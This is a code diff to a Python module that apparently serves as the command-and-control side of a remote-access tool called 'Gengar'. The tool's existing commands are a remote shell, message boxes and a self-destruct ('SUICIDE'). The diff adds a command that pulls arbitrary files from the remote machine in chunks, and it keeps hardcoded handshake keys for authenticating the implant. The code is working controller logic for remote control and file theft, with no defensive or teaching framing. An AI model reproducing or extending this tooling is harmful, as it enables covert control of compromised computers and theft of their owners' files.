@@ -4,6 +4,7 @@ import struct
 from dataclasses import dataclass
 from typing import Union
 
+import output
 from logger import logger
 
 
@@ -12,9 +13,11 @@ class CommandTypes:
     SHELL = 1
     MSGBOX = 2
     SUICIDE = 3
+    DOWNLOAD_FILE = 4
 
 
 INT_SIZE = 4
+LONG_SIZE = 8
 
 
 class GengarAuthenticationFailed(Exception):
@@ -33,16 +36,17 @@ class ShellOutput:
     output: Union[str, bytes]
 
 
-AUTH_KEY_FROM_GENGAR = b'4be166c8-5aa2-4db2-90a1-446aacd14d32'
-AUTH_KEY_TO_GENGAR = b'b6c077c1-12d1-4dbb-8786-d22a7090bfae'
-
-
 @dataclass
 class Gengar:
     _sock: socket.socket
     host: str
     _authenticated: bool = False
     alive: bool = True
+
+    AUTH_KEY_FROM_GENGAR = b'4be166c8-5aa2-4db2-90a1-446aacd14d32'
+    AUTH_KEY_TO_GENGAR = b'b6c077c1-12d1-4dbb-8786-d22a7090bfae'
+
+    FILE_IO_CHUNK_SIZE = 8192
 
     def init(self):
         self.spawn_time = datetime.datetime.now()
@@ -101,6 +105,27 @@ class Gengar:
         self._send(struct.pack('I', CommandTypes.MSGBOX) + struct.pack('I', len(title)) +
                    title.encode() + struct.pack('I', len(text)) + text.encode())
 
+    def download_file(self, remote_path: str, local_path: str = None):
+        local_path = local_path or output.generate_path(remote_path)
+
+        self._send(struct.pack('I', CommandTypes.DOWNLOAD_FILE) +
+                   struct.pack('I', len(remote_path)) + remote_path.encode())
+        return_code = struct.unpack('I', self._recv(INT_SIZE))[0]
+        if return_code != 0:
+            logger.error(f'Failed to download file: {return_code}')
+            return
+
+        bytes_remaining = struct.unpack('Q', self._recv(LONG_SIZE))[0]
+        logger.info(f'Downloading {remote_path} ({bytes_remaining})')
+        with open(local_path, 'wb') as output_file:
+            while True:
+                if not bytes_remaining:
+                    break
+                bytes_to_read = min(bytes_remaining, self.FILE_IO_CHUNK_SIZE)
+                file_chunk = self._recvall(bytes_to_read)
+                output_file.write(file_chunk)
+                bytes_remaining -= bytes_to_read
+
     def suicide(self):
         self._send(struct.pack('I', CommandTypes.SUICIDE))
         self._sock.close()
@@ -119,10 +144,10 @@ class Gengar:
 
         try:
             self._sock.settimeout(5)
-            received_auth_key = self._recv(len(AUTH_KEY_FROM_GENGAR))
-            if received_auth_key != AUTH_KEY_FROM_GENGAR:
+            received_auth_key = self._recv(len(self.AUTH_KEY_FROM_GENGAR))
+            if received_auth_key != self.AUTH_KEY_FROM_GENGAR:
                 raise GengarAuthenticationFailed
-            self._send(AUTH_KEY_TO_GENGAR)
+            self._send(self.AUTH_KEY_TO_GENGAR)
             self._authenticated = True
         except socket.timeout:
             raise GengarAuthenticationFailed
